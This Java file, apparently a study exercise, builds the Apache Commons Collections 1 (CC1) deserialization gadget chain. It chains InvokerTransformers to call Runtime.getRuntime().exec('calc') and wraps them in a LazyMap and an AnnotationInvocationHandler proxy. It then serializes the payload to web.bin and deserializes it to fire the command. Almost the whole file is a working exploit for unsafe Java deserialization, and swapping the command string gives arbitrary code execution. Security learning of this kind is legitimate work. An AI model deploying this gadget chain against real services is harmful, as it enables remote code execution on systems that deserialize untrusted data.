package top.foreverwl.study.ser;

/**
 * @program: CC1_v1
 * @description:
 * @author: 168
 * @create: 2024-07-10 17:15
 **/
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.io.Serializable;
import java.lang.annotation.Retention;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

public class CCtest03 {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
        //恶意攻击类，命令执行
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
//        chainedTransformer.transform(Runtime.class);
        HashMap innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, chainedTransformer);
//        Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);

//        map.put("value","asd");
//        Map<Object,Object> transformedmap = TransformedMap.decorate(map,null,chainedTransformer);
        //创建AnnotationInvocationHandler类
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotation = c.getDeclaredConstructor(Class.class,Map.class);
        annotation.setAccessible(true);
        InvocationHandler handler = (InvocationHandler)
                annotation.newInstance(Retention.class, outerMap);
        Map proxMap= (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[] {Map.class},handler);
        handler = (InvocationHandler)
                annotation.newInstance(Retention.class, proxMap);

//             Object o = annotation.newInstance(Target.class,2transformedmap);
        serialize(handler);
        unserialize("web.bin");
    }

    public static void serialize(Object object) throws IOException {
        FileOutputStream fileOutputStream = new FileOutputStream("web.bin");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(object);
        System.out.println("1.序列化成功");
    }

    public static void unserialize(String filename) throws IOException, ClassNotFoundException {
        FileInputStream fileInputStream = new FileInputStream(filename);
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
        System.out.println("2.反序列化成功");
    }
}